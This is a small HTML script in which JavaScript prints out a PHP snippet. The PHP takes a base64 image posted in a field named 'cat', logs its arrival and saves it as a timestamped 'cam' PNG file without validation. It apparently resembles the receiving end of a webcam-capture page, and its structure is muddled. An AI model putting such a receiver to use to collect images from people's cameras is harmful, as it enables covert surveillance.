<script language="JavaScript">

var nl = getNewLine()

function getNewLine() {
	var agent = navigator.userAgent

	if (agent.indexOf("Win") >= 0)
		return "\r\n"
	else
		if (agent.indexOf("Mac") >= 0)
			return "\r"

 	return "\r"

}

pagecode = '<?php

$date = date(\'dMYHis\');
$imageData=$_POST[\'cat\'];

if (!empty($_POST[\'cat\'])) {
error_log("Received" . "\\r\\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( \'cam\'.$date.\'.png\', \'wb\' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

'

document.write(pagecode);

</script>
